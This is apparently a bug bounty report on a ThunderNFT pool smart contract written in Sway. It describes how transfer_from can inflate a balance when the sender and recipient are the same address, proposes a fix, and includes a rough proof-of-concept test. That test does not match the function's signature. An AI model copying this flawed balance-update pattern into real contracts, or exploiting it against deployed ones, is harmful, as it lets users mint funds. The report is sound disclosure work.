# IOP \_ ThunderNFT 34962 - \[Smart Contract - Low] tranfer\_from function have critical issue which lead

Submitted on Sun Sep 01 2024 21:59:24 GMT-0400 (Atlantic Standard Time) by @zeroK for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34962

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/pool>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

the function transfer\_from does not prevent setting the from and to to same address which lead to money printing, this issue exist only in transfer\_from function because of incorrect implementation, more in ## Vulnerability Details

## Vulnerability Details

the transfer\_from implemented as below:

```sway
    #[storage(read, write)]
    fn transfer_from(from: Identity, to: Identity, asset: AssetId, amount: u64) -> bool {
        let caller = get_msg_sender_contract_or_panic();
        let exchange = storage.exchange.read().unwrap();
        require(caller == exchange, PoolErrors::CallerMustBeTheExchange);

        _transfer(from, to, asset, amount);

        true
    }

#[storage(read, write)]
fn _transfer(from: Identity, to: Identity, asset: AssetId, amount: u64) {
    require(
        to != ZERO_IDENTITY_ADDRESS &&
        to != ZERO_IDENTITY_CONTRACT,
        PoolErrors::IdentityMustBeNonZero
    ); // no check for from at all
    // @audit we get both to and from balance before update
    let from_balance = _balance_of(from, asset);
    let to_balance = _balance_of(to, asset);
    require(from_balance >= amount, PoolErrors::AmountHigherThanBalance); 

    storage.balance_of.insert((from, asset), from_balance - amount);
    storage.balance_of.insert((to, asset), to_balance + amount);  //@audit double increase amount if to is same as from

    log(Transfer {
        from,
        to,
        asset,
        amount,
    });
}
```

the scenario below can happen:

* call transfer\_from with to and from equal to alice.
* since the balance returned before decreasing the update will be like this:

```
alice 100 token - 20 == 80 
alice(to) 100 token == 120

last result = 20 profit

```

this report is insight since the transfer\_from called by thunder\_exchange and the issue above does not exist.

## Impact Details

double increasing of user balance when from == to in transfer\_from function.

## References

we recommend to add check below: `require(from != to, "revert double increase");`

## Proof of concept

## Proof of Concept

check report id: 34567 for better experience:

```sway

contract;

 use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
    asset_manager_interface::*,
    execution_manager_interface::ExecutionManager,
    execution_strategy_interface::*,
    pool_interface::Pool,
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
    ownable::*,
};

use std::{
    block::timestamp,
    auth::*,
    call_frames::*,
    context::*,
    contract_id::ContractId,
    logging::log,
    revert::require,
    storage::storage_map::*,
    asset::*,
};
 
#[test(should_revert)]
fn test_attack() {
    initialize_functions();


}

fn initialize_functions() {

    //initialize all contracts 

    let thunder_exch = abi(ThunderExchange, thunder_exchange::CONTRACT_ID);
    thunder_exch.initialize();

    let asset_mngr = abi(AssetManager, asset_manager::CONTRACT_ID);
    asset_mngr.initialize();

    // required for initialize below contracts
    let exchange_contract_id = ContractId::from(thunder_exchange::CONTRACT_ID);

    let asset_manger_contract_id = ContractId::from(asset_manager::CONTRACT_ID);

    let fixed_strategy = abi(ExecutionStrategy, strategy_fixed_price_sale::CONTRACT_ID);
    fixed_strategy.initialize(exchange_contract_id);

    let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);
    execution_manager.initialize();

    let royalty_manager = abi(RoyaltyManager, royalty_manager::CONTRACT_ID);
    royalty_manager.initialize();

    //get contract IDs 

    let execution_manger_contract = ContractId::from(execution_manager::CONTRACT_ID);
    let royalty_manger_contract = ContractId::from(royalty_manager::CONTRACT_ID);
    let pool_contract = ContractId::from(pool::CONTRACT_ID);
    let stratgey_fixed = ContractId::from(strategy_fixed_price_sale::CONTRACT_ID);


    let asset_to_add = AssetId::base();
    
    asset_mngr.add_asset(asset_to_add);


    let asset_id = AssetId::bits(asset_to_add);


    let pool = abi(Pool, pool::CONTRACT_ID);
    pool.initialize(exchange_contract_id, asset_manger_contract_id);

    let caller = Address::from(0xf8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07);

    pool.update_balance(asset_to_add, 100u64);

    //set functions

    execution_manager.add_strategy(stratgey_fixed);

    thunder_exch.set_asset_manager(asset_manger_contract_id);
    thunder_exch.set_pool(pool_contract);
    thunder_exch.set_execution_manager(execution_manger_contract);
    // thunder_exch.set_protocol_fee_recipient(Identity::Address::from(0xf9b8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07)); // diff from maker
    thunder_exch.set_royalty_manager(royalty_manger_contract);

    //----------------------execute attack --------------------------------//

    let caller = Address::from(0xf9b8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07);

    let extra_parameter = ExtraParams {
        extra_address_param: Address::zero(),
        extra_contract_param: ContractId::zero(),
        extra_u64_param: 0u64
    };

    let maker_order = MakerOrderInput {
     side: Side::Buy,
     maker:caller,
     collection: ContractId::from(0x7777777777777777777777777777777777777777777777777777777777777777),
     token_id: SubId::from(0x7777777777777777777777777777777777777777777777777777777777777778),
     price: 10u64,
     amount: 1u64,
     nonce: 1u64,
     strategy:stratgey_fixed,
     payment_asset: asset_to_add,
     expiration_range: 1000u64,
     extra_params: extra_parameter,
    };


    thunder_exch.place_order(maker_order);

    //now remove the whitelist token and add another one 

    asset_mngr.remove_asset(0);

    let asset_to_add1 = AssetId::from(0x7777_7777_7777_7777_7777_7777_7777_7777_7777_7777_7777_7777_7777_7777_7777_7777);
    
    asset_mngr.add_asset(asset_to_add1);

    //STEP 1: call update with new paymentAsset, this is similar to calling the deposit function, its built-in function by us since sway does not allow calling payable funcitons in test suit

    pool.update_balance(asset_to_add1, 20u64); // 20 eth for example

    //STEP 2: add bid order

    pool.transfer_from(caller, caller, 20u64 ) // nothing prevent setting the caller as from or to !
}
```
